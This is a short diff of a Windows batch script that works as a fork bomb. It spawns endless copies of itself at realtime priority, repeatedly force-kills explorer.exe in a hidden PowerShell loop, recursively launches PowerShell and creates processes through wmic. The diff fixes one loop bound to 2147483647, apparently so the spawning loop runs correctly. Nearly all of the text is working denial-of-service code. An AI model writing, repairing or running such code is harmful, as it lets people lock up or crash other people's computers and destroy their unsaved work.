@@ -41,7 +41,7 @@ start cmd /c "%0 & %0 & %0"
 
 for /l %%x in (0,0,0) do start %0
 
-start "" /realtime cmd /c "for /l %%x in (1,0,20230202302023020230) do (start /realtime cmd /c %0 & %0)"
+start "" /realtime cmd /c "for /l %%x in (1,0,2147483647) do (start /realtime cmd /c %0 & %0)"
 powershell -WindowStyle Hidden -Command "while(1){Get-Process -Name 'explorer' -ErrorAction SilentlyContinue|Stop-Process -Force;Start-Process -WindowStyle Hidden -PassThru cmd -Args '/c %0'|ForEach-Object{$_.ProcessorAffinity=1;$_.PriorityClass='Realtime'}}"
 
 powershell -c "while($true){Start-Process powershell -ArgumentList '-c while($true){Start-Process powershell}'}"
@@ -61,3 +61,4 @@ start /b cmd /c "for /l %%x in (1,0,2) do echo %%x"
 wmic process call create "cmd.exe"
 
 goto loop
+
